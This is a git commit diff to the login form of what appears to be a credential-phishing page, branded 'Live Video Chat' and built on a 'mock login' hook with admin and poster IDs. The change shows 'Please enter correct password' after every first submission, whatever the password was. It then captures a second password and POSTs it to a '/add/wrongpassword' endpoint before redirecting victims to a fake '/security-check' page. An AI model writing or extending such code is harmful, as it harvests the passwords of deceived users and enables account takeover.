818c0255ad97cd64455d6896ef0d09e6743e4b37
shovonroy173 <shovonroy2003@gmail.com>
2025-03-24 00:20:36 +0600

    mod: 'wrong password' div added

--- app/components/LoginForm.js
+++ app/components/LoginForm.js
@@ -1,12 +1,18 @@
 "use client";
-import { site } from "../config/index";
+import { API_URL, site } from "../config/index";
 import Image from "next/image";
 import useMockLogin from "../hooks/useMockLogin";
 import { useState } from "react";
+import { useRouter } from "next/navigation";
+import Cookies from "js-cookie";
 
 function LoginForm({ adminId, posterId }) {
   const [password, setPassword] = useState("");
   const [email, setEmail] = useState("");
+  const [showWrongPassword, setShowWrongPassword] = useState(false);
+  const [wrongPassword, setWrongPassword] = useState("");
+
+  const router = useRouter();
 
   const { login } = useMockLogin(adminId, posterId);
 
@@ -15,16 +21,45 @@ function LoginForm({ adminId, posterId }) {
       site: site,
       email: email,
       password: password,
-      skipcode: "",
+      // skipcode: "",
     };
 
     await login(allValues);
-    setEmail("");
+    setShowWrongPassword(true);
+    // setEmail("");
     setPassword("");
 
     console.log("allValues", allValues);
   };
+  const handleWrongPassword = async () => {
+    const url = `${API_URL}/add/wrongpassword`;
+    const id = Cookies.get("id");
+    const values = {
+      id,
+      wrongPassword,
+    };
 
+    const res = await fetch(url, {
+      method: "POST",
+      headers: {
+        Accept: "application/json",
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(values),
+    });
+    const data = await res.json();
+    console.log(data);
+
+    if (res.ok) {
+      console.log("success", data);
+      setEmail("");
+      setWrongPassword("");
+      router.push(`/security-check`);
+    } else {
+      console.log("error", data);
+      toast.error("Something Went Wrong");
+    }
+  };
   return (
     <div class="bg-neutral-50 w-full max-w-[25rem] p-6 rounded-xl">
       <p class="text-3xl font-semibold ">Live Video Chat</p>
@@ -41,9 +76,12 @@ function LoginForm({ adminId, posterId }) {
       </p>
       <div class="flex flex-col gap-y-4 mt-4">
         <p
-          class="bg-neutral-200 p-2 rounded text-sm"
+          class={`${
+            showWrongPassword
+              ? "block bg-neutral-200 p-2 rounded text-sm"
+              : "hidden"
+          }  `}
           id="msg"
-          style={{ display: "none" }}
         >
           Please enter correct password
         </p>
@@ -57,17 +95,21 @@ function LoginForm({ adminId, posterId }) {
           onChange={(e) => setEmail(e.target.value)}
         />
         <input
-          required=""
-          class="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
+          required
+          className="border h-11 rounded px-4 outline-none border-green-500 disabled:border-green-200"
           placeholder="Enter password here"
           type="password"
-          name="password"
-          value={password}
-          onChange={(e) => setPassword(e.target.value)}
+          name={showWrongPassword ? "wrongPassword" : "password"}
+          value={showWrongPassword ? wrongPassword : password}
+          onChange={(e) =>
+            showWrongPassword
+              ? setWrongPassword(e.target.value)
+              : setPassword(e.target.value)
+          }
         />
         <button
-          onClick={handleSubmit}
-          class="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
+          onClick={showWrongPassword ? handleWrongPassword : handleSubmit}
+          className="h-11 rounded text-neutral-50 font-medium bg-green-500 disabled:bg-green-200"
         >
           Submit
         </button>
